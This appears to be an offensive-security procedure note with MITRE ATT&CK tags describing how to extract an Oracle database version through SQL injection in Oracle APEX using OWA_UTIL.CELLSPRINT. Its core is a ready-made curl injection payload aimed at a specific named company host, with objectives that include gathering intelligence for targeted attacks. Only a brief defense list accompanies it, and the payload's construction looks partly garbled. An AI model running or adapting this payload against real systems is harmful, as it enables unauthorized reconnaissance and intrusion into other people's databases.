---
tags:
  - sqli
  - data-exfiltration
  - oracle
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/extract-db-version-payload]]'
verified: false
platforms:
  - Web
  - Oracle Database
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T03:46:25.750Z'
sub_techniques: []
id: dd720374-3dd3-4872-9dfe-52efc389a702
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
---
# Extract-Database-Version-via-SQL-Injection

## Summary

This procedure exploits a confirmed SQL injection to execute PL/SQL code using OWA_UTIL.CELLSPRINT, querying the v$version view to extract and display the Oracle database version banner, providing reconnaissance on the target's backend.

## Description

Targeting the /pls/apex/f endpoint in Oracle APEX, the payload closes the expected SQL statement with ');', executes the PL/SQL block to select and print the banner, and comments out the rest with --. This leverages Oracle's web toolkit functions for output without direct response control, revealing version details like 11g Release 11.2.0.3.0.

## Requirements

1. Confirmed SQLi vulnerability from prior detection
2. Access to Burp Suite or equivalent for payload injection
3. Knowledge of Oracle PL/SQL functions like OWA_UTIL.CELLSPRINT

## Defense

Defensive measures and detection strategies:

- Validate and escape all user inputs in APEX applications
- Restrict PL/SQL execution to sanitized procedures
- Log and alert on queries accessing system views like v$version

## Objectives

1. Retrieve database version for compatibility assessment
2. Confirm Oracle backend and potential further exploits
3. Gather intel for targeted attacks

## Instructions

### Step 1: Craft and Send Version Extraction Payload

**Context**: Inject the PL/SQL block to select and print the version banner using the injectable parameter.

**Command** ([[commands/extract-db-version-payload]]):
```bash
curl "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version" -d ":1=SELECT banner FROM v$version" -v
```

> The payload executes SELECT banner FROM v$version within OWA_UTIL.CELLSPRINT, outputting the full version string in the response body.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Local System]]

### Sub-Techniques


## Commands Used

- [[commands/extract-db-version-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- sqli
- plsql
- reconnaissance
